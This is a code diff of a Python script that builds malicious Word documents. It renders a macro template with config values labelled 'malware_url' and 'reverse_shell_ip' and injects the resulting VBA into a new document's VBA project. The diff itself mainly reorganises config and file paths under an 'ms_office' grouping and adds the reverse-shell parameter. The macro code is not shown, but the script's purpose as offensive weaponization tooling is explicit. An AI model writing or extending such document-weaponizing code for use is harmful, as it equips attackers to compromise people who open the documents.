@@ -31,7 +31,8 @@ def insert_macro_from_file(macro_path, target_doc):
 
     # Add the value from cfg["app"]["malware_url"] to the template
     rendered_macro = macro_template.render(
-        malware_url=cfg["app"]["malware_url"])
+        malware_url=cfg["app"]["macros"]["malware_url"],
+        reverse_shell_ip = cfg["app"]["macros"]["reverse_shell_ip"])
 
     target_vba_project = target_doc.VBProject
     target_vba_project.VBComponents(
@@ -40,8 +41,8 @@ def insert_macro_from_file(macro_path, target_doc):
 
 def main(template_id, macro_id):
     # Get template path from config using template_id
-    template_name = cfg['templates']['word'][template_id]
-    template_path = os.path.join(template_dir, "files", template_name)
+    template_name = cfg['templates']["ms_office"]['word'][template_id]
+    template_path = os.path.join(template_dir, "files", "ms_office", template_name)
 
     # Load the Word template (template with the associated macro)
     word_app, template_doc = load_word_template(template_path)
@@ -57,8 +58,8 @@ def main(template_id, macro_id):
     new_doc = word_app.Documents.Open(new_doc_path)
 
     # Insert macro from text file into the new document
-    macro_name = cfg['macros'][macro_id]
-    macro_path = os.path.join(template_dir, "macros", macro_name)
+    macro_name = cfg['macros']["ms_office"][macro_id]
+    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
     insert_macro_from_file(macro_path, new_doc)
 
     # Save the output document with the macro inserted
